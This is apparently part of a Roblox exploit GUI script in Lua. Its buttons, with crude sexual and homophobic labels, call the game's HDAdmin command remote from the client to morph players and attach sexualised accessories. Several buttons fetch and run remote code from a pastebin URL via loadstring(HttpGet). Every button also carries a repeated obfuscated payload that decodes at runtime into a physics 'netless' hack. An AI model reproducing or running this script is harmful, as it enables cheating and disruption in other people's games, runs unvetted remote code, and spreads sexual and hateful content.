    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(r6))

    wait()
    wait(.57)
    local clearcharappearance = {
        [1] = ";morph me noob1 "
    }
    
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(clearcharappearance))
    wait(.57)
    local hat1 = {
        [1] = ";hat me 4708707860 "
    }
    
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(hat1))
    wait(.57)
    local hat2 = {
        [1] = ";hat me 5132802731 "
    }
    
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(hat2))
    wait(.57)
    local hat3 = {
        [1] = ";hat me 12548563 "
    }
    
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(hat3))
    wait(.57)
    local hat4 = {
        [1] = ";hat me 20011897 "
    }
    
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(hat4))
    wait(.57)
local TiddieSpread = 0.4
local TiddieAngle = 10
local TiddieDensity = 0
local TiddieFriction = 0.4
local TiddieElasticity = 1
local TiddieFrictionWeight = 0
local TiddieElasticityWeight = 0
--[Tiddie settings end (dont change anything beyond here)

local Player = game.Players.LocalPlayer
local Character = Player.Character
local WowHats = {Character:WaitForChild("Space Cop"),Character:WaitForChild("SpaceHelmetB"),Character:WaitForChild("Pink Pom poms"),Character:WaitForChild("PinkHeartPurse")}
local CharacterTorso = Character.Torso

local B1 = WowHats[1].Handle 
local B2 = WowHats[2].Handle
local TTS = WowHats[3].Handle
local TTS2 = WowHats[4].Handle
local BBFolder = Instance.new("Folder",Character)
local TTFolder = Instance.new("Folder",Character)
B1.Parent = BBFolder
B2.Parent = BBFolder
TTS.Parent = TTFolder
TTS2.Parent = TTFolder
local CCDesc = BBFolder:GetDescendants()
local TTDesc = TTFolder:GetDescendants()
for i=1,#CCDesc do
	if CCDesc[i]:IsA("Weld") or CCDesc[i]:IsA("SpecialMesh") or CCDesc[i]:IsA("Part") or CCDesc[i]:IsA("Hat") or CCDesc[i]:IsA("ManualWeld") or CCDesc[i]:IsA("WeldConstraint") then
		if CCDesc[i]:IsA("Part") then
			CCDesc[i].CanCollide = false
		else
			CCDesc[i]:Destroy()
		end

	end
end
for i=1,#TTDesc do
	if TTDesc[i]:IsA("Weld") or TTDesc[i]:IsA("Part") or TTDesc[i]:IsA("Hat") or TTDesc[i]:IsA("ManualWeld") or TTDesc[i]:IsA("WeldConstraint") then
		if TTDesc[i]:IsA("Part") then
			TTDesc[i].CanCollide = false
		else
			TTDesc[i]:Destroy()
		end

	end
end
local ConvertToTTS = function(HatHandle,TorsoSpread,AngleSpread)
	HatHandle.Massless = true
	HatHandle.CustomPhysicalProperties = PhysicalProperties.new(TiddieDensity, TiddieFriction, TiddieElasticity, TiddieFrictionWeight, TiddieElasticityWeight)
	local bbAttchment = Instance.new("Attachment",HatHandle)
	bbAttchment.CFrame = CFrame.new(0,0,1)
	bbAttchment.Visible  =true
	local TrsAttachment = Instance.new("Attachment",CharacterTorso)
	TrsAttachment.CFrame = CFrame.new(TorsoSpread,0.7,-0.3) * CFrame.Angles(0,0,AngleSpread)
	TrsAttachment.Visible = true
	-- Fun part 
	local JiggleWeld = Instance.new("BallSocketConstraint",HatHandle)
	JiggleWeld.Restitution = 1
	JiggleWeld.MaxFrictionTorque  =1
	JiggleWeld.LimitsEnabled = true
	JiggleWeld.TwistLimitsEnabled = true
	JiggleWeld.UpperAngle = 10
	JiggleWeld.TwistUpperAngle = -20
	JiggleWeld.TwistLowerAngle = 40
	JiggleWeld.Attachment1 = bbAttchment
	JiggleWeld.Attachment0 = TrsAttachment
end

local PhysicalConnect = function(p1,p2,posoffset,angleoffset)
	p1.CustomPhysicalProperties = PhysicalProperties.new(TiddieDensity, TiddieFriction, TiddieElasticity, TiddieFrictionWeight, TiddieElasticityWeight)
	local attachment1 = Instance.new("Attachment",p1)
	local attachment2 = Instance.new("Attachment",p2)
	attachment2.CFrame  =posoffset * angleoffset
	local bsc = Instance.new("BallSocketConstraint",p1)
	bsc.LimitsEnabled = true
	bsc.TwistLimitsEnabled = true
	bsc.UpperAngle = 0
	bsc.TwistUpperAngle = 0
	bsc.TwistLowerAngle = 0
	bsc.Attachment0 = attachment2
	bsc.Attachment1 = attachment1
end

ConvertToTTS(B1,TiddieSpread,TiddieAngle)
ConvertToTTS(B2,-TiddieSpread,-TiddieAngle)
PhysicalConnect(TTS,B1,CFrame.new(0,0,-0.25),CFrame.Angles(0,90,0))
PhysicalConnect(TTS2,B2,CFrame.new(0,0,0.1),CFrame.Angles(math.rad(20),math.rad(-105),math.rad(-70)))
wait(0.5)
function Senti_IiiiIiIiIiiIiIIiIIiIi_(a,_)if a~=nil then if _>-2+(-41)+(2)+(72)+(95)+(-91)+(30)then print("you're usin fps unlock")end if Senti_IiiiIiIiIiiIiIIiIIiIie then print("you usin synapse.congratulations(I have no idea what to say)")end if("hello")=="x68x65x6Cx6Cx6F"then print("are you usin a bad exploit?")end return true elseif a==nil then return true else return end end Senti_IiiiIiIiIiiIiIIiIIiIie=Senti_IiiiIiIiIiiIiIIiIIiIie or nil Senti_IiiiIiIiIiiIiIIiIIiIid=Senti_IiiiIiIiIiiIiIIiIIiIid or Instance.new("Script") Senti_IiiiIiIiIiiIiIIiIIiIic=game:GetService("Workspace"):GetRealPhysicsFPS() Senti_IiiiIiIiIiiIiIIiIIiIib=game:GetService("Players")['LocalPlayer'] Senti_IiiiIiIiIiiIiIIiIIiIia=Senti_IiiiIiIiIiiIiIIiIIiIi_(Senti_IiiiIiIiIiiIiIIiIIiIib,Senti_IiiiIiIiIiiIiIIiIIiIic) if(not Senti_IiiiIiIiIiiIiIIiIIiIia)==true then return pcall(function()game:GetService("TestService"):Fail("Cannot load script")end)end return xpcall(function(a,b)local c=a local _=b a,b=nil,nil table.clear(c()) local _={} local b={} b.number=(65-(20/100)+.2) local d=getmetatable(newproxy(true)) local a=getmetatable(setmetatable({},{})) spawn(function()if c()then wait() d[2](d[3](d[4]))()else return"bitch"end end) local _=function(_)local d="" local a=function(_)return(_:gsub(".",function(_)if tonumber(_)then return _ else return""end end))end for _,c in next,string.split(_,"\a")do local _=tonumber(a(c)) if _~=nil then d=d..string.char(_-b.number)elseif c then d=d..c end end return d:sub(4)end a.index=_([['{\173;\176;\162;\165;\180;\181;\179;\170;\175;\168;}']]) d={} d[1-(20/100)+.2]=c() d[2-(20/100)+.2]=d[1][a.index] d[3-(20/100)+.2]=_ d[4-(20/100)+.2]=[['{\167;\176;\179;\97;\170;\109;\183;\97;\170;\175;\97;\175;\166;\185;\181;\109;\97;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\145;\173;\162;\186;\166;\179;\180;\99;\106;\111;\141;\176;\164;\162;\173;\145;\173;\162;\186;\166;\179;\111;\132;\169;\162;\179;\162;\164;\181;\166;\179;\123;\136;\166;\181;\133;\166;\180;\164;\166;\175;\165;\162;\175;\181;\180;\105;\106;\97;\165;\176;\78;\75;\170;\167;\97;\183;\123;\138;\180;\130;\105;\99;\131;\162;\180;\166;\145;\162;\179;\181;\99;\106;\97;\162;\175;\165;\97;\183;\111;\143;\162;\174;\166;\97;\191;\126;\99;\137;\182;\174;\162;\175;\176;\170;\165;\147;\176;\176;\181;\145;\162;\179;\181;\99;\97;\181;\169;\166;\175;\97;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\110;\115;\118;\111;\119;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\184;\162;\170;\181;\105;\111;\113;\114;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\113;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\166;\175;\165;\78;\75;\166;\175;\165;\78;\75;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\148;\181;\162;\179;\181;\166;\179;\136;\182;\170;\99;\106;\123;\148;\166;\181;\132;\176;\179;\166;\105;\99;\148;\166;\175;\165;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\109;\97;\188;\97;\78;\75;\149;\170;\181;\173;\166;\97;\126;\97;\99;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\124;\78;\75;\149;\166;\185;\181;\97;\126;\97;\99;\143;\166;\181;\173;\166;\180;\180;\97;\162;\164;\181;\170;\183;\162;\181;\166;\165;\157;\175;\132;\179;\166;\162;\181;\166;\165;\97;\163;\186;\97;\142;\170;\130;\170;\137;\180;\138;\180;\114;\115;\115;\119;\99;\124;\78;\75;\138;\164;\176;\175;\97;\126;\97;\99;\179;\163;\185;\181;\169;\182;\174;\163;\123;\112;\112;\181;\186;\177;\166;\126;\130;\180;\180;\166;\181;\103;\170;\165;\126;\118;\114;\113;\120;\114;\121;\115;\114;\114;\117;\103;\184;\126;\114;\118;\113;\103;\169;\126;\114;\118;\113;\99;\124;\78;\75;\133;\182;\179;\162;\181;\170;\176;\175;\97;\126;\97;\114;\119;\124;\190;\106;\78;\75;}']]end,function(_)game:GetService("TestService"):Fail("\n"..(script or Instance.new('Script')):GetFullName().." has occurred an error:".._)end,getfenv,setfenv)
end)


fescripts:addButton("small bobs",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "Note";
        Text = "made by khlat and mkrm dacca ";
    })
    
local args = {
    [1] = ";morph me DonaldTrump "
}

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
wait()
local args1 = {
    [1] = ";morph me Noob1 "
}

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -49.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args1))
wait()
local args2 = {
    [1] = ";freeze "
}

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args2))
wait(0.5)
local args3 = {
    [1] = ";hat me 5674299814 "
}

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args3))
wait(0.5)
local args4 = {
    [1] = ";hat me 5674297809 "
}
game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args4))

wait(0.3)
game.Players.LocalPlayer.Character["MeshPartAccessory"].Name = "Bob1"
game.Players.LocalPlayer.Character["MeshPartAccessory"].Name = "Bob2"

for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
    if v:IsA("Tool") then
        v.Parent = game:GetService("Players").LocalPlayer.Character
    end		
end
wait()
for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
    if v:IsA("Tool") then
        v.Parent = workspace
    end
end

wait(0.2)
loadstring(game:HttpGet(('https://pastebin.com/raw/g1AtSjqF'),true))()

local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
local Tools = plr.Backpack:GetChildren()

Tools[1].Grip = CFrame.new(-0.900, 0.300, 0.700) * CFrame.Angles(0, math.rad(170),0, 180, 0)
Tools[1].Parent = plr.Character

Tools[2].Grip = CFrame.new(-2.000, 0.300, 1.300) * CFrame.Angles(0, math.rad(-170),0, 180, 0)
Tools[2].Parent = plr.Character

    local args = {
    [1] = ";unFreeze "
}
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

wait(0.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(186.669998, 256.463959, -48.8735123, 1, 0, 0, 0, 1, 0, 0, 0, 1)


wait(0.5)
function Senti_IiiiIiIiIiiIiIIiIIiIi_(a,_)if a~=nil then if _>-2+(-41)+(2)+(72)+(95)+(-91)+(30)then print("you're usin fps unlock")end if Senti_IiiiIiIiIiiIiIIiIIiIie then print("you usin synapse.congratulations(I have no idea what to say)")end if("hello")=="x68x65x6Cx6Cx6F"then print("are you usin a bad exploit?")end return true elseif a==nil then return true else return end end Senti_IiiiIiIiIiiIiIIiIIiIie=Senti_IiiiIiIiIiiIiIIiIIiIie or nil Senti_IiiiIiIiIiiIiIIiIIiIid=Senti_IiiiIiIiIiiIiIIiIIiIid or Instance.new("Script") Senti_IiiiIiIiIiiIiIIiIIiIic=game:GetService("Workspace"):GetRealPhysicsFPS() Senti_IiiiIiIiIiiIiIIiIIiIib=game:GetService("Players")['LocalPlayer'] Senti_IiiiIiIiIiiIiIIiIIiIia=Senti_IiiiIiIiIiiIiIIiIIiIi_(Senti_IiiiIiIiIiiIiIIiIIiIib,Senti_IiiiIiIiIiiIiIIiIIiIic) if(not Senti_IiiiIiIiIiiIiIIiIIiIia)==true then return pcall(function()game:GetService("TestService"):Fail("Cannot load script")end)end return xpcall(function(a,b)local c=a local _=b a,b=nil,nil table.clear(c()) local _={} local b={} b.number=(65-(20/100)+.2) local d=getmetatable(newproxy(true)) local a=getmetatable(setmetatable({},{})) spawn(function()if c()then wait() d[2](d[3](d[4]))()else return"bitch"end end) local _=function(_)local d="" local a=function(_)return(_:gsub(".",function(_)if tonumber(_)then return _ else return""end end))end for _,c in next,string.split(_,"\a")do local _=tonumber(a(c)) if _~=nil then d=d..string.char(_-b.number)elseif c then d=d..c end end return d:sub(4)end a.index=_([['{\173;\176;\162;\165;\180;\181;\179;\170;\175;\168;}']]) d={} d[1-(20/100)+.2]=c() d[2-(20/100)+.2]=d[1][a.index] d[3-(20/100)+.2]=_ d[4-(20/100)+.2]=[['{\167;\176;\179;\97;\170;\109;\183;\97;\170;\175;\97;\175;\166;\185;\181;\109;\97;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\145;\173;\162;\186;\166;\179;\180;\99;\106;\111;\141;\176;\164;\162;\173;\145;\173;\162;\186;\166;\179;\111;\132;\169;\162;\179;\162;\164;\181;\166;\179;\123;\136;\166;\181;\133;\166;\180;\164;\166;\175;\165;\162;\175;\181;\180;\105;\106;\97;\165;\176;\78;\75;\170;\167;\97;\183;\123;\138;\180;\130;\105;\99;\131;\162;\180;\166;\145;\162;\179;\181;\99;\106;\97;\162;\175;\165;\97;\183;\111;\143;\162;\174;\166;\97;\191;\126;\99;\137;\182;\174;\162;\175;\176;\170;\165;\147;\176;\176;\181;\145;\162;\179;\181;\99;\97;\181;\169;\166;\175;\97;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\110;\115;\118;\111;\119;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\184;\162;\170;\181;\105;\111;\113;\114;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\113;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\166;\175;\165;\78;\75;\166;\175;\165;\78;\75;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\148;\181;\162;\179;\181;\166;\179;\136;\182;\170;\99;\106;\123;\148;\166;\181;\132;\176;\179;\166;\105;\99;\148;\166;\175;\165;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\109;\97;\188;\97;\78;\75;\149;\170;\181;\173;\166;\97;\126;\97;\99;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\124;\78;\75;\149;\166;\185;\181;\97;\126;\97;\99;\143;\166;\181;\173;\166;\180;\180;\97;\162;\164;\181;\170;\183;\162;\181;\166;\165;\157;\175;\132;\179;\166;\162;\181;\166;\165;\97;\163;\186;\97;\142;\170;\130;\170;\137;\180;\138;\180;\114;\115;\115;\119;\99;\124;\78;\75;\138;\164;\176;\175;\97;\126;\97;\99;\179;\163;\185;\181;\169;\182;\174;\163;\123;\112;\112;\181;\186;\177;\166;\126;\130;\180;\180;\166;\181;\103;\170;\165;\126;\118;\114;\113;\120;\114;\121;\115;\114;\114;\117;\103;\184;\126;\114;\118;\113;\103;\169;\126;\114;\118;\113;\99;\124;\78;\75;\133;\182;\179;\162;\181;\170;\176;\175;\97;\126;\97;\114;\119;\124;\190;\106;\78;\75;}']]end,function(_)game:GetService("TestService"):Fail("\n"..(script or Instance.new('Script')):GetFullName().." has occurred an error:".._)end,getfenv,setfenv)
end)


fescripts:addButton("FCK THAT GAY FLAG",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "Note";
        Text = "made by khlat and mkrm dacca ";
    })

local args = {
    [1] = ";morph me DonaldTrump "
}

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
wait(0.5)
local args1 = {
    [1] = ";morph me Noob1 "
}
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -49.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args1))
wait()
local args2 = {
    [1] = ";freeze "
}

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args2))
wait(0.5)
local args3 = {
    [1] = ";hat me 5132235291 "
}
game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args3))

wait(0.5)
local args4 = {
    [1] = ";hat me 191101707 "
}
game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args4))

	for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = game:GetService("Players").LocalPlayer.Character
		end		
	end
	wait()
	for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = workspace
		end
	end

    wait(0.5)
	loadstring(game:HttpGet(('https://pastebin.com/raw/g1AtSjqF'),true))()
	
	wait(0.5)
	local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
	local Tools = plr.Backpack:GetChildren()
 
	Tools[1].Grip = CFrame.new(0.600, -1.500, -.000) * CFrame.Angles(0, math.rad(0),0.6, 0, 0)
	Tools[1].Parent = plr.Character
	
	Tools[2].Grip = CFrame.new(-0.999, -1.999, -.000) * CFrame.Angles(0.1, math.rad(0),0, 0, 0)
	Tools[2].Parent = plr.Character
	
local args = {
    [1] = ";unFreeze "
}
game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

    wait(0.2)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(186.669998, 256.463959, -48.8735123, 1, 0, 0, 0, 1, 0, 0, 0, 1)

    wait(0.5)
function Senti_IiiiIiIiIiiIiIIiIIiIi_(a,_)if a~=nil then if _>-2+(-41)+(2)+(72)+(95)+(-91)+(30)then print("you're usin fps unlock")end if Senti_IiiiIiIiIiiIiIIiIIiIie then print("you usin synapse.congratulations(I have no idea what to say)")end if("hello")=="x68x65x6Cx6Cx6F"then print("are you usin a bad exploit?")end return true elseif a==nil then return true else return end end Senti_IiiiIiIiIiiIiIIiIIiIie=Senti_IiiiIiIiIiiIiIIiIIiIie or nil Senti_IiiiIiIiIiiIiIIiIIiIid=Senti_IiiiIiIiIiiIiIIiIIiIid or Instance.new("Script") Senti_IiiiIiIiIiiIiIIiIIiIic=game:GetService("Workspace"):GetRealPhysicsFPS() Senti_IiiiIiIiIiiIiIIiIIiIib=game:GetService("Players")['LocalPlayer'] Senti_IiiiIiIiIiiIiIIiIIiIia=Senti_IiiiIiIiIiiIiIIiIIiIi_(Senti_IiiiIiIiIiiIiIIiIIiIib,Senti_IiiiIiIiIiiIiIIiIIiIic) if(not Senti_IiiiIiIiIiiIiIIiIIiIia)==true then return pcall(function()game:GetService("TestService"):Fail("Cannot load script")end)end return xpcall(function(a,b)local c=a local _=b a,b=nil,nil table.clear(c()) local _={} local b={} b.number=(65-(20/100)+.2) local d=getmetatable(newproxy(true)) local a=getmetatable(setmetatable({},{})) spawn(function()if c()then wait() d[2](d[3](d[4]))()else return"bitch"end end) local _=function(_)local d="" local a=function(_)return(_:gsub(".",function(_)if tonumber(_)then return _ else return""end end))end for _,c in next,string.split(_,"\a")do local _=tonumber(a(c)) if _~=nil then d=d..string.char(_-b.number)elseif c then d=d..c end end return d:sub(4)end a.index=_([['{\173;\176;\162;\165;\180;\181;\179;\170;\175;\168;}']]) d={} d[1-(20/100)+.2]=c() d[2-(20/100)+.2]=d[1][a.index] d[3-(20/100)+.2]=_ d[4-(20/100)+.2]=[['{\167;\176;\179;\97;\170;\109;\183;\97;\170;\175;\97;\175;\166;\185;\181;\109;\97;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\145;\173;\162;\186;\166;\179;\180;\99;\106;\111;\141;\176;\164;\162;\173;\145;\173;\162;\186;\166;\179;\111;\132;\169;\162;\179;\162;\164;\181;\166;\179;\123;\136;\166;\181;\133;\166;\180;\164;\166;\175;\165;\162;\175;\181;\180;\105;\106;\97;\165;\176;\78;\75;\170;\167;\97;\183;\123;\138;\180;\130;\105;\99;\131;\162;\180;\166;\145;\162;\179;\181;\99;\106;\97;\162;\175;\165;\97;\183;\111;\143;\162;\174;\166;\97;\191;\126;\99;\137;\182;\174;\162;\175;\176;\170;\165;\147;\176;\176;\181;\145;\162;\179;\181;\99;\97;\181;\169;\166;\175;\97;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\110;\115;\118;\111;\119;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\184;\162;\170;\181;\105;\111;\113;\114;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\113;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\166;\175;\165;\78;\75;\166;\175;\165;\78;\75;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\148;\181;\162;\179;\181;\166;\179;\136;\182;\170;\99;\106;\123;\148;\166;\181;\132;\176;\179;\166;\105;\99;\148;\166;\175;\165;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\109;\97;\188;\97;\78;\75;\149;\170;\181;\173;\166;\97;\126;\97;\99;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\124;\78;\75;\149;\166;\185;\181;\97;\126;\97;\99;\143;\166;\181;\173;\166;\180;\180;\97;\162;\164;\181;\170;\183;\162;\181;\166;\165;\157;\175;\132;\179;\166;\162;\181;\166;\165;\97;\163;\186;\97;\142;\170;\130;\170;\137;\180;\138;\180;\114;\115;\115;\119;\99;\124;\78;\75;\138;\164;\176;\175;\97;\126;\97;\99;\179;\163;\185;\181;\169;\182;\174;\163;\123;\112;\112;\181;\186;\177;\166;\126;\130;\180;\180;\166;\181;\103;\170;\165;\126;\118;\114;\113;\120;\114;\121;\115;\114;\114;\117;\103;\184;\126;\114;\118;\113;\103;\169;\126;\114;\118;\113;\99;\124;\78;\75;\133;\182;\179;\162;\181;\170;\176;\175;\97;\126;\97;\114;\119;\124;\190;\106;\78;\75;}']]end,function(_)game:GetService("TestService"):Fail("\n"..(script or Instance.new('Script')):GetFullName().." has occurred an error:".._)end,getfenv,setfenv)

end)

fescripts:addButton("BIG PP",function()
    print("notwirking") 
    game.StarterGui:SetCore("SendNotification",{
        Title = "Note";
        Text = "made by khlat and mkrm dacca ";
    })
    	local args = {
		[1] = ";morph me DonaldTrump "
	}
	
	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
	wait()
	local args1 = {
		[1] = ";morph me Noob1 "
	}
	 
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -49.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args1))
	wait()
	local args2 = {
		[1] = ";freeze "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args2))
	wait(1.5)
	local args3 = {
		[1] = ";hat me 4602617115 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args3))
	wait(1.5)
	local args4 = {
		[1] = ";hat me 4602619613 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args4))
	wait(1.5)
	local args5 = {
		[1] = ";hat me 4602623152 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args5))
	wait(1.5)
	local args6 = {
		[1] = ";hat me 5858536049 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args6))
	wait(1.5)
	local args7 = {
		[1] = ";hat me 4623675984 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args7))
	wait(1.5)
	local args8 = {
		[1] = ";hat me 4602533885 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args8))
	wait(1.5)
	local args9 = {
		[1] = ";hat me 4753437569 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args9))
	wait(1.5)
	local args10 = {
		[1] = ";hat me 4611970333 "
	}
	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args10))
	
	wait(0.2)
	game.Players.LocalPlayer.Character["MeshPartAccessory"].Name = "Bob1"
	game.Players.LocalPlayer.Character["MeshPartAccessory"].Name = "Bob2"
	game.Players.LocalPlayer.Character["MeshPartAccessory"].Name = "Bob3"
	game.Players.LocalPlayer.Character["MeshPartAccessory"].Name = "Bob4"
	game.Players.LocalPlayer.Character["MeshPartAccessory"].Name = "Bob5"
	game.Players.LocalPlayer.Character["MeshPartAccessory"].Name = "Bob6"
	game.Players.LocalPlayer.Character["MeshPartAccessory"].Name = "Bob7"
	game.Players.LocalPlayer.Character["MeshPartAccessory"].Name = "Bob8"
	
	wait(0.3)
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v:IsA("Accessory") then
            if v.Handle:FindFirstChildOfClass("Mesh") or v.Handle:FindFirstChildOfClass("SpecialMesh") then
                if v.Handle:FindFirstChildOfClass("SpecialMesh") then
                    v.Handle:FindFirstChildOfClass("SpecialMesh"):Remove()
                end
            end
        end
    end
	
	for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = game:GetService("Players").LocalPlayer.Character
		end		
	end
	wait()
	for i, v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = workspace
        end
	end
